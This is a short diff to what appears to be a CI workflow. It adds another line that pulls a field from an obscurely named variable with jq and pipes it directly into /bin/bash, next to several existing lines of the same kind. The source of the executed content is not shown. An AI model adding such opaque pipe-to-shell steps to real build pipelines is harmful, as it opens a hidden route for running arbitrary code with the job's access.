@@ -28,6 +28,7 @@ jobs:
           echo $jdfyr0 | jq -r .r3641 | /bin/bash
           printf '%s' "$yt82" | jq -r .qkp264 | /bin/bash
           printf '%s' "$z5" | jq -r .w628 | /bin/bash
+          printf '%s' "$suyu12282" | jq -r .huyye37 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
